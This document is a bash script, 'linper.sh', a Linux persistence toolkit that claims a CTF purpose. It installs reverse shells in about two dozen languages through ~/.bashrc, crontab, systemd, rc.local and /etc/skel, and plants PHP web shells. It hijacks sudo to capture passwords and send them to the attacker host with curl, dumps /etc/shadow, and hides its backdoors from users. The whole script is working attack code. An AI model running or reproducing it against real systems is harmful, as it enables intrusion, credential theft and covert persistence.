#!/bin/bash

CLEAN=0
CLEANSYSMSG=0
COUNTER=0
CRON="* * * * *"
DISABLEBASHRC=0
DRYRUN=0
EASYINSTALLDIR=$(echo $WRITABLE_DIR/$(uuidgen))
ENUM_DEF=0
VALIDSYNTAX=0
LIMIT=0
STEALTHMODE=0
PIPDIR=$(echo $WRITABLE_DIR/$(uuidgen))
PIP3DIR=$(echo $WRITABLE_DIR/$(uuidgen))
REMOVALTOOL=$(which srm) || REMOVALTOOL=$(which rm)
RANDOMPHPFILE=$(echo $(uuidgen).php)
RANDOMPORT=$(expr 1024 + $RANDOM)
SHELL="/bin/bash"
SERVICEFILE=$(echo $(uuidgen).service)
SERVICESHELLSCRIPT=$(echo $(uuidgen).sh)


INFO="linux persistence toolkit\n\nadvisory: this was developed with ctfs in mind and that is its intended use case. please do not use this tool in an unethical or illegal manner.\n"

HELP="\e[33m-h, --help\e[0m show this message
\e[33m--examples\e[0m print example commands
\e[33m-d, --dryrun\e[0m dry run, do not install persistence, just enumerate relevant binaries
\e[33m-e, --enum-defenses\e[0m try to enumerate any defenses relevant to installing reverse shells
\e[33m-i, --rhost\e[0m IP/domain to call back to
\e[33m-p, --rport\e[0m port to call back to
\e[33m-l, --limit\e[0m number of reverse shells to install (default: all)
\e[33m--cron\e[0m cron schedule for any reverse shells executed by crontab (default: every minute)
\e[33m-c, --clean\e[0m removes any reverse shells installed by this program for the given RHOST
\e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans
\e[33m-w, --writable-dir\e[0m set the directory to install any temporary files (default: checks /dev/shm, /tmp, and /var/tmp)"

EXAMPLES="Examples:

Enumerate binaries that can be used for persistence
bash linper.sh -d
bash linper.sh --dryrun

Enumerate defenses
bash linper.sh -e
bash linper.sh --enum-defenses

Install persistence to call back to 192.168.1.2:4444 (default cron & noisy)
bash linper.sh -i 192.168.1.2 -p 4444
bash linper.sh --rhost 192.168.1.2 -rport 4444

Install only 3 reverse shells
bash linper.sh -i 192.168.1.2 -p 4444 -l 3
bash linper.sh --rhost 192.168.1.2 --rport 4444 --limit 3

Install persistence (custom cron & stealthy)
bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
bash linper.sh -rhost 192.168.1.2 --rport 4444 --cron \"* * * 2 3\" --stealth-mode

Remove persistence for 192.168.1.2
bash linper.sh -i 192.168.1.2 -c
bash linper.sh --rhost 192.168.1.2 --clean"

while test $# -gt 0;
do
	case "$1" in
	-h|--help)
		echo -e "$INFO"
		echo -e "$HELP"
		exit ;;
	--examples)
		echo -e "$EXAMPLES"
		exit ;;
	-d|--dryrun)
		shift
		DRYRUN=1 ;;
	--cron)
		shift
		export CRON=$1
		shift ;;
	-s|--stealth-mode)
		shift
		STEALTHMODE=1 ;;
	-i|--rhost)
		shift
		if test $# -gt 0;
		then
		export RHOST=$1
		fi
		shift ;;
	-p|--rport)
		shift
		if test $# -gt 0;
		then
		export RPORT=$1
		fi
		shift ;;
	-l|--limit)
		shift
		if test $# -gt 0
		then
		export LIMIT=$1
		fi
		shift ;;
	-c|--clean)
		CLEAN=1
		shift ;;
	-e|--enum-defenses)
		shift
		ENUM_DEF=1 ;;
	-w|--writable-dir)
		shift
		WRITABLE_DIR="$1" 
		shift ;;
	esac
done

invalid_syntax_exit() {

	echo -e "$INFO"
	echo -e "$HELP"
	exit

}

syntax_checker() {

	if [ "$CLEAN" -eq 1 ] && $(echo "$RHOST" | grep -qi "[a-zA-Z0-9]" 2> /dev/null);
	then
		:
	elif [ "$DRYRUN" -eq 1 ]
	then
		:
	elif [ "$ENUM_DEF" -eq 1 ];
	then
		:
	elif [ "$DRYRUN" -eq 0 ] && $(echo "$RHOST" | grep -qi "[a-zA-Z0-9]" 2> /dev/null) && $(echo "$RPORT" | grep -qi "[a-zA-Z0-9]" 2> /dev/null);
	then
		:
	else
		invalid_syntax_exit
	fi

}

limit_checker(){

	if test $1 -eq $LIMIT;
	then
		echo "-----------------------"
		echo -e "\e[92m[+]\e[0m Installed $LIMIT reverse shells; exiting"
		echo "-----------------------"
		exit
	fi

}

find_writable() {

	echo -e "\e[92m[+]\e[0m Searching for writable directory to store temporary files"
	if [ -z ${WRITABLE_DIR+x} ];
	then
		export WRITABLE_DIR=$(find /dev/shm /var/tmp /tmp -type d -writable 2> /dev/null | grep --color=never -o -e '^/dev/shm$' -e '^/var/tmp$' -e '^/tmp$' | head -n 1)
	else
		if [ $WRITABLE_DIR = "." ];
		then
			export WRITABLE_DIR=$(pwd)
		fi
		export WRITABLE_DIR=$(find $WRITABLE_DIR -type d -writable 2> /dev/null | head -n 1)
	fi

	TMPTEST=$WRITABLE_DIR/$(uuidgen)

	(touch $TMPTEST && $REMOVALTOOL $TMPTEST) 2> /dev/null || (echo -e "\e[91m[-]\e[0m Error: Could not find a writable directory for temporary files" && echo -e "\e[93m[!]\e[0m Action: You can force one with -w, --writable-dir" && echo -e "\e[91m[-]\e[0m Killing Process" && kill -9 $$)

	echo -e "\e[92m[+]\e[0m Choosing $WRITABLE_DIR"


	export TMPCRON=$(echo $WRITABLE_DIR/$(uuidgen))
	export TMPCRONWITHPAYLOAD=$(echo $WRITABLE_DIR/$(uuidgen))
	export TMPJJSFILE=$(echo $WRITABLE_DIR/$(uuidgen))
	export SUDOPASSWORDFILE=$(echo $WRITABLE_DIR/$(uuidgen))
	export TMPRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
	export TMPGOFILE=$(echo $WRITABLE_DIR/$(uuidgen).go)

}

stealth_modifications(){

	DISABLEBASHRC=1
	SERVICEFILE=$(echo /etc/systemd/system/.$(uuidgen).service)
	SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(uuidgen))

	echo 'function crontab () { #linpercrontab
	REALBIN="$(which crontab)" #linpercrontab
	if $(echo "$1" | grep -qi "\-l"); #linpercrontab
	then #linpercrontab
		if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ]; #linpercrontab
		then #linpercrontab
			echo no crontab for $(whoami) #linpercrontab
		else #linpercrontab
			$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" #linpercrontab
		fi #linpercrontab
	elif $(echo "$1" | grep -qi "\-r"); #linpercrontab
	then #linpercrontab
		if $($REALBIN -l | grep "'$RHOST'" | grep -qi "'$RPORT'"); #linpercrontab
		then #linpercrontab
			$REALBIN -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab #linpercrontab
		else #linpercrontab
			$REALBIN -r #linpercrontab
		fi #linpercrontab
	else #linpercrontab
		$REALBIN "${@:1}" #linpercrontab
	fi #linpercrontab
	} #linpercrontab' >> ~/.bashrc && echo -e "\e[92m[+]\e[0m --stealth-mode modificaitons complete" && echo "-----------------------"

}

METHODS=(
	"awk , awk --version , awk 'BEGIN {s = \\\"/inet/tcp/0/$RHOST/$RPORT\\\"; while(42) { do{ printf \\\"shell>\\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \\\$0 |& s; close(c); } } while(c != \\\"exit\\\") close(s); }}' /dev/null?"
	"bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
	"easy_install , mkdir $WRITABLE_DIR/$EASYINSTALLDIR && echo 'import sys,socket,os,pty;exit()' > $WRITABLE_DIR/$EASYINSTALLDIR/setup.py; easy_install $WRITABLE_DIR/$EASYINSTALLDIR 2> /dev/null &> /dev/null , mkdir $WRITABLE_DIR/$EASYINSTALLDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $WRITABLE_DIR/$EASYINSTALLDIR/setup.py; easy_install $EASYINSTALLDIR?"
	"gdb , gdb -nx -ex 'python import sys,socket,os,pty;exit()' &> /dev/null , echo 'c' | gdb -nx -ex 'python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' -ex quit &> /dev/null?"
	"go , echo 'package main;import\"os\";func main() { os.Exit(0) };' > $TMPGOFILE && go run $TMPGOFILE , echo 'package main;import\\\"os/exec\\\";import\\\"net\\\";func main(){c,_:=net.Dial(\\\"tcp\\\",\\\"$RHOST:$RPORT\\\");cmd:=exec.Command(\\\"$SHELL\\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > $TMPGOFILE && go run $TMPGOFILE?"
	"irb , echo \\\"require 'socket'\\\" | irb --noecho --noverbose , echo \\\"require 'socket'; exit if fork;c=TCPSocket.new('$RHOST',$RPORT);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read} end\\\" | irb --noecho --noverbose?"
	"jrunscript , jrunscript -e 'exit();' , jrunscript -e 'var host=\\\"$RHOST\\\"; var port=$RPORT;var p=new java.lang.ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'?"
	"jjs , echo \"quit()\" > $TMPJJSFILE && jjs $TMPJJSFILE , echo 'var ProcessBuilder = Java.type(\\\"java.lang.ProcessBuilder\\\");var p=new ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var Socket = Java.type(\\\"java.net.Socket\\\");var s=new Socket(\\\"$RHOST\\\",$RPORT);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\\\"java.lang.Thread\\\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs?" 
	"ksh , ksh -c 'exit' , ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
	"nc , nc -w 1 -lnvp $RANDOMPORT &> /dev/null & nc 0.0.0.0 $RANDOMPORT &> /dev/null , nc $RHOST $RPORT -e $SHELL?"
	"node , node -e \"process.exit(0)\" , node -e \\\"sh = require(\\\\\\\"child_process\\\\\\\").spawn(\\\\\\\"$SHELL\\\\\\\");net.connect($RPORT, \\\\\\\"$RHOST\\\\\\\", function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});\\\"?"
	"perl , perl -e \"use Socket;\" , perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($RPORT,inet_aton(\\\"$RHOST\\\")))){open(STDIN,\\\"\>\&S\\\");open(STDOUT,\\\"\>\&S\\\");open(STDERR,\\\"\>\&S\\\");exec(\\\"$SHELL -i\\\");};'?"
	"php , php -r 'exit();' , php -r \\\"exec(\\\\\\\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\"?"
	"php7.4 , php7.4 -r 'exit();' , php7.4 -r \\\"exec(\\\\\\\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\"?"
	"pwsh , pwsh -command 'exit' , pwsh -command '\\\$client = New-Object System.Net.Sockets.TCPClient(\\\"$RHOST\\\",$RPORT);\\\$stream = \\\$client.GetStream();[byte[]]\\\$bytes = 0..65535|%{0};while((\\\$i = \\\$stream.Read(\\\$bytes, 0, \\\$bytes.Length)) -ne 0){;\\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$bytes,0, \\\$i);\\\$sendback = (iex \\\$data 2>&1 | Out-String );\\\$sendback2 = \\\$sendback + \\\"# \\\";\\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\\$sendback2);\\\$stream.Write(\\\$sendbyte,0,\\\$sendbyte.Length);\\\$stream.Flush()};\\\$client.Close()'?"
	"pip , mkdir $PIPDIR; echo 'import socket,subprocess,os;exit()' > $PIPDIR/setup.py; pip install $PIPDIR 2>&1 | grep -qi 'ERROR: No .egg-info directory found in' , mkdir $PIPDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $PIPDIR/setup.py; pip install $PIPDIR?"
	"pip3 , mkdir $PIP3DIR && echo 'import socket,subprocess,os;exit()' > $PIP3DIR/setup.py; pip3 install $PIP3DIR 2>&1 | grep -qi 'ERROR: No .egg-info directory found in' , mkdir $PIP3DIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $PIP3DIR/setup.py; pip3 install $PIP3DIR?"
	"python , python -c 'import socket,subprocess,os;exit()' , python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"python2 , python2 -c 'import socket,subprocess,os;exit()' , python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"python2.7 , python2.7 -c 'import socket,subprocess,os;exit()' , python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"python3 , python3 -c 'import socket,subprocess,os;exit()' , python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"python3.8 , python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"ruby , ruby -rsocket -e 'exit' , ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"'$RHOST'\\\",'$RPORT');while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end'?"
	"socat , socat tcp-listen:$RANDOMPORT STDOUT & echo exit | socat -t 1 STDIN tcp-connect:0.0.0.0:$RANDOMPORT , socat tcp-connect:$RHOST:$RPORT exec:$SHELL,pty,stderr,setsid,sigint,sane?"
	"telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(echo $WRITABLE_DIR/$(uuidgen);mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
)

enum_methods() {

	IFS="?"
	for s in ${METHODS[@]};
	do
		METHOD=$(echo $s | awk -F ' , ' '{print $1}')
		EVAL_STATEMENT=$(echo $s | awk -F ' , ' '{print $2}')
		PAYLOAD=$(echo $s | awk -F ' , ' '{print $3}')
		if $(echo $METHOD | grep -qi "[a-z]")
		then
			echo "$EVAL_STATEMENT" | $SHELL 2> /dev/null 1>&2
			if [ $? -eq 0 ];
			then
				echo -e "\e[92m[+]\e[0m Method Found: $METHOD"
				enum_doors $METHOD $PAYLOAD
			fi
		fi
	done

}

enum_doors() {

	DOORS=(
	"bashrc , if test -f ~/.bashrc; then touch ~/.bashrc; else touch ~/.bashrc &&  ~/.bashrc; fi , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> ~/.bashrc?"
	"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD; if grep -qi [A-Za-z0-9] $TMPCRONWITHPAYLOAD; then crontab $TMPCRONWITHPAYLOAD; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD && chmod +x $TMPCRONWITHPAYLOAD?"
	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$SERVICESHELLSCRIPT; if test -f /etc/systemd/system/$SERVICEFILE; then echo > /dev/null; else touch /etc/systemd/system/$SERVICEFILE; echo \"[Service]\" >> /etc/systemd/system/$SERVICEFILE; echo \"Type=oneshot\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$SERVICESHELLSCRIPT\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$SERVICEFILE; echo \"[Install]\" >> /etc/systemd/system/$SERVICEFILE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$SERVICEFILE; chmod 644 /etc/systemd/system/$SERVICEFILE; systemctl start $SERVICEFILE 2> /dev/null & sleep .0001; systemctl enable $SERVICEFILE 2> /dev/null & sleep .0001; fi;?"
	"/etc/rc.local , if test -f /etc/rc.local; then touch /etc/rc.local; else touch /etc/rc.local &&  /etc/rc.local; fi , if test -f /etc/rc.local; then LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
	"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> /etc/skel/.bashrc?"
	)

	IFS="?"
	for s in ${DOORS[@]};
	do
		if $(echo $PAYLOAD | grep -qi "[a-z]")
		then
			DOOR=$(echo $s | awk -F ' , ' '{print $1}')
			EVAL_STATEMENT=$(echo $s | awk -F ' , ' '{print $2}')
			HINGE=$(echo $s | awk -F ' , ' '{print $3}')
			if $(echo $DOOR | grep -qi "[a-z]")
			then
				echo "$EVAL_STATEMENT" | $SHELL 2> /dev/null
				if [ $? -eq 0 ];
				then
					if echo $DOOR | grep -qi "[a-z]";
					then
						if [ $DISABLEBASHRC -eq 1 ] && $(echo $DOOR | grep -qi bashrc);
						then
							:
						else
							echo -e "\e[92m[+]\e[0m Door Found: $DOOR"
							if [ "$DRYRUN" -eq 0 ];
							then
								echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null
								if [ $? -eq 0 ];
								then
									echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR"
									COUNTER=$(expr $COUNTER + 1)
									limit_checker $COUNTER
								fi
							fi
						fi
					fi
				fi
			fi
		fi
	done
	echo "-----------------------"

}

webserver_poison_attack() {

	unset IFS

	if $(grep -qi "www-data" /etc/passwd)
	then
		if $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d 2> /dev/null | grep -qi "[A-Za-z0-9]")
		then
			echo -e "\e[92m[+]\e[0m Web Server Poison Attack Available for the Following Directories"
			for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d);
			do
				echo -e "\e[92m[+]\e[0m Directory Found: $i"
				if [ $DRYRUN -eq 0 ];
				then
					IFS="?"
					for s in ${METHODS[@]};
					do
						METHOD=$(echo $s | awk -F ' , ' '{print $1}')
						PAYLOAD=$(echo $s | awk -F ' , ' '{print $3}')
						if $(echo $METHOD | grep -qi "php");
						then	
							unset IFS
							RANDOMPHPFILE=$(echo $(uuidgen).php)
							if [ "$STEALTHMODE" -eq 1 ];
							then
								RANDOMPHPFILE=$(echo .$(uuidgen).php)
							fi
							PAYLOAD="<?php exec(\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\"); ?>"
							echo $PAYLOAD > $i/$RANDOMPHPFILE && echo -e "\e[92m[+]\e[0m Persistence Installed: PHP Reverse Shell $i/$RANDOMPHPFILE" && COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
							IFS="?"
						fi
					done	
					unset IFS
				fi
			done
		echo "-----------------------"
		fi
	fi

}

sudo_hijack_attack() {

	if $(cat /etc/group | grep sudo | grep -qi $(whoami)) && $(which curl | grep -qi curl);
	then
		if [ "$DRYRUN" -eq 0 ];
		then
			echo 'function sudo () { #linpersudo
			REALSUDO="$(which sudo)" #linpersudo
			SUDOPASSWORDFILE="'$SUDOPASSWORDFILE'" #linpersudo
			read -s -p "[sudo] password for $USER: " PASSWD #linpersudo
			printf "\n"; printf "%s\n" "$USER : $PASSWD" >> $SUDOPASSWORDFILE #linpersudo
			sort -uo "$SUDOPASSWORDFILE" "$SUDOPASSWORDFILE" #linpersudo
			ENCODED=$(cat "$SUDOPASSWORDFILE" | base64 | tr -d "\n") > /dev/null 2>&1 #linpersudo
			curl -k -s "https://'$RHOST'/$ENCODED" > /dev/null 2>&1 #linpersudo
			$REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1 #linpersudo
			$REALSUDO "${@:1}" #linpersudo
			} #linpersudo' >> ~/.bashrc &&
			echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access" &&
			echo "[+] Password will be Stored in $SUDOPASSWORDFILE" &&
			echo "[+] $SUDOPASSWORDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
		else
			echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
		fi
		echo "-----------------------"
	fi

}

shadow() {

	if $(find /etc/shadow -readable | grep -qi shadow)
	then
		if [ "$DRYRUN" -eq 0 ];
		then
			echo -e "\e[92m[+]\e[0m Accounts with Passwords from /etc/shadow"
			egrep -v "\*|\!" /etc/shadow
		else
			echo -e "\e[92m[+]\e[0m You Can Read /etc/shadow"
		fi
		echo "-----------------------"
	fi

}

cleanup() {

	TMPCLEANBASHRC=$(echo $WRITABLE_DIR/$(uuidgen))
	TMPCLEANBASHRC2=$(echo $WRITABLE_DIR/$(uuidgen))
	TMPCLEANBASHRC3=$(echo $WRITABLE_DIR/$(uuidgen))
	TMPCLEANRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))

	echo -e "\e[92m[+]\e[0m Removing modifications, this may take a while..."
	
	if $(grep -qi "#linpercrontab" ~/.bashrc);
	then
		grep -v "#linpercrontab" ~/.bashrc > $TMPCLEANBASHRC &&
		cp $TMPCLEANBASHRC ~/.bashrc &&
		echo -e "\e[92m[+]\e[0m Removed crontab function from ~/.bashrc"
	fi

	if $(grep -qi "#linpersudo" ~/.bashrc);
	then
		grep -v "#linpersudo" ~/.bashrc > $TMPCLEANBASHRC &&
		cp $TMPCLEANBASHRC ~/.bashrc &&
		echo -e "\e[92m[+]\e[0m Removed sudo function from bashrc"
	fi

	if $(grep -q $1 ~/.bashrc);
	then
		grep -v $1 ~/.bashrc > $TMPCLEANBASHRC &&
		cp $TMPCLEANBASHRC ~/.bashrc &&
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from ~/.bashrc"
	fi

	CRONBINARY=$(which crontab)
	if $($CRONBINARY -l 2> /dev/null | grep -q $1);
	then
		$CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null 1>&2 && $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null | $CRONBINARY || $CRONBINARY -r
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from crontab"
	fi

	for i in $(find /etc/systemd/ -writable -type f 2> /dev/null);
	do
		grep -q $1 $i 2> /dev/null
		if [[ $? -eq 0 ]];
		then
			TMP=$(echo $i | sed 's/.*\///g' | tr -d '.' | sed 's/..$//g')
			for j in $(find /etc/systemd/ -writable -type f);
			do
				grep -q $TMP $j 2> /dev/null
				if [[ $? -eq 0 ]];
				then
					$REMOVALTOOL $i $j
					CLEANSYSMSG=1
				fi
			done
		fi
	done

	if [ "$CLEANSYSMSG" -eq 1 ];
	then
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from systemctl"
	fi

	if $(grep -q $1 /etc/rc.local 2> /dev/null);
	then
		grep -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL
		cp $TMPCLEANRCLOCAL "/etc/rc.local"
		if $(cat /etc/rc.local | wc -l | grep -q "^2$");
		then
			$REMOVALTOOL "/etc/rc.local"
		fi
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/rc.local"
	fi

	if $(cat /etc/skel/.bashrc 2> /dev/null | grep -q $1);
	then
		grep -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC
		cp $TMPCLEANBASHRC /etc/skel/.bashrc
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
	fi

	cd $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') && grep -R --color=never "$1" . | awk -F: '{print $1}' | xargs $REMOVALTOOL 2> /dev/null &> /dev/null && echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}')/*"

}

enum_defenses() {

	echo -e "\e[92m[+]\e[0m Enumerating Tripwire Policies"
	file /etc/tripwire/* | grep "ASCII" | awk -F: '{print $1}' | xargs cat | grep --color=always -e ^SEC -e systemd -e crontab -e bashrc -e rc\.local -e /etc/skel || echo "[+] None Found"

}

main() {

	syntax_checker
	
	if [ "$CLEAN" -eq 1 ];
	then
		find_writable
		cleanup $RHOST
		exit
	fi

	if [ "$ENUM_DEF" -eq 1 ];
	then
		enum_defenses
		exit
	fi

	if [ "$STEALTHMODE" -eq 1 ];
	then
		stealth_modifications
	fi
	
	find_writable
	sudo_hijack_attack $SUDOPASSWORDFILE
	shadow
	enum_methods
	webserver_poison_attack

	echo -e "\e[92m[+]\e[0m Removing temporary files"
	remove_tmp_files
	echo -e "\e[92m[+]\e[0m Done"
	exit 0

}

main